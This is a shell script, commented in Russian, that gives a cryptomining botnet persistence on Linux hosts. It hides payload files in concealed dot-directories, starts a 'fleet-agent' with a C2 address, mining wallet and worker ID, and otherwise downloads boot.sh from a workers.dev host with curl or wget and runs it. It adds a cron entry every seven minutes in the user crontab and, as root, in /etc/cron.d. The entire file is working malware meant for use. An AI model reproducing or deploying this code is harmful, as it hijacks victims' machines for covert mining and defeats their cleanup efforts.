#!/bin/sh
# cron_persist.sh — cron-носитель. Их схема: /etc/.dd/cron-fetch.sh + строка в crontab,
# fallback $HOME/.usr_cron/lib, /var/tmp/.dd. Без cron остаётся channel-persistence.
# Запуск: sh cron_persist.sh
#
# Правка 2026-11-09: носитель передаёт кошелёк и ID. Раньше после очистки $D
# агент поднимался без KF_WALLET и писал в c.json user=".<wid>" — майнинг в пустоту.
# Если $D снесли целиком, носитель тянет boot.sh (там дефолтный кошелёк).
D=/var/tmp/.kf
URL="${KF_FETCH:-https://edge-static.cdn-edge-e9d.workers.dev/boot.sh}"
MARK="${KF_MARK:-kf9}"

log() { [ -n "${KF_QUIET:-}" ] || echo "[cron] $*"; }
[ -f "$D/00-common.sh" ] && { . "$D/00-common.sh"; kf_cron_log "cron-полоса: старт"; }

# immortal уже поставил cron в системные места — второй носитель не нужен
[ -f "$D/.cron_ok" ] && { log "cron уже стоит (immortal)"; exit 0; }

# сначала пробуем поднять каталог из tmpfs-зеркала
if [ ! -x "$D/fleet-agent.sh" ] && [ -d /dev/shm/.kf ]; then
  mkdir -p "$D" 2>/dev/null
  cp -a /dev/shm/.kf/. "$D"/ 2>/dev/null
fi

DIR=""
for d in /etc/.dd "$HOME/.usr_cron/lib" /var/tmp/.dd; do
  mkdir -p "$d" 2>/dev/null || continue
  [ -w "$d" ] && { DIR="$d"; break; }
done
[ -n "$DIR" ] || { log "нет записываемого каталога — cron невозможен"; exit 1; }

SELF="$DIR/cron-fetch.sh"
cat > "$SELF.tmp.$$" <<EOS
#!/bin/sh
# $MARK
D='$D'
ID=\$(cat "\$D/id" 2>/dev/null)
C2=\$(head -1 "\$D/c2list" 2>/dev/null)
W=\$(cat "\$D/.wallet" 2>/dev/null)
[ -d /dev/shm/.kf ] && [ ! -x "\$D/fleet-agent.sh" ] && cp -a /dev/shm/.kf/. "\$D"/ 2>/dev/null
if [ -x "\$D/fleet-agent.sh" ] && [ -s "\$D/c2list" ]; then
  KF_WALLET="\$W" KF_MARK='$MARK' sh "\$D/fleet-agent.sh" "\$C2" "\$ID" </dev/null >/dev/null 2>&1 &
else
  if command -v curl >/dev/null 2>&1; then
    curl -fsSL -m 90 -A '$MARK' -o /tmp/.kb '$URL' 2>/dev/null
  elif command -v wget >/dev/null 2>&1; then
    wget -q -T 90 -O /tmp/.kb '$URL' 2>/dev/null
  fi
  [ -s /tmp/.kb ] && KF_WID="\$ID" KF_WALLET="\$W" sh /tmp/.kb </dev/null >/dev/null 2>&1 &
fi
EOS
chmod 700 "$SELF.tmp.$$" 2>/dev/null
sh -n "$SELF.tmp.$$" 2>/dev/null || { log "носитель не прошёл sh -n"; rm -f "$SELF.tmp.$$"; exit 1; }
mv -f "$SELF.tmp.$$" "$SELF" 2>/dev/null || { rm -f "$SELF.tmp.$$"; exit 1; }

# user crontab: поле пользователя запрещено (иначе строка молча игнорируется)
LINE="*/7 * * * * $SELF >/dev/null 2>&1"
if command -v crontab >/dev/null 2>&1; then
  if crontab -l 2>/dev/null | grep -qF "$SELF"; then
    log "crontab уже содержит строку"
  elif { crontab -l 2>/dev/null; echo "$LINE"; } | crontab - 2>/dev/null; then
    log "crontab установлен: $SELF"
    printf '%s' "1" > "$D/.cron_ok" 2>/dev/null
  else
    log "crontab не принял строку, файл оставлен: $SELF"
  fi
fi

# root: дополнительно /etc/cron.d, там поле пользователя обязательно
if [ "$(id -u 2>/dev/null || echo 1)" -eq 0 ] && [ -d /etc/cron.d ] && [ -w /etc/cron.d ]; then
  printf '*/7 * * * * root %s >/dev/null 2>&1\n' "$SELF" > /etc/cron.d/kf.tmp.$$ 2>/dev/null && \
    chmod 644 /etc/cron.d/kf.tmp.$$ 2>/dev/null && \
    mv -f /etc/cron.d/kf.tmp.$$ /etc/cron.d/kf 2>/dev/null && \
    printf '%s' "1" > "$D/.cron_ok" 2>/dev/null
fi

[ -f "$D/.cron_ok" ] || log "cron недоступен — channel-only persistence, файл: $SELF"
exit 0
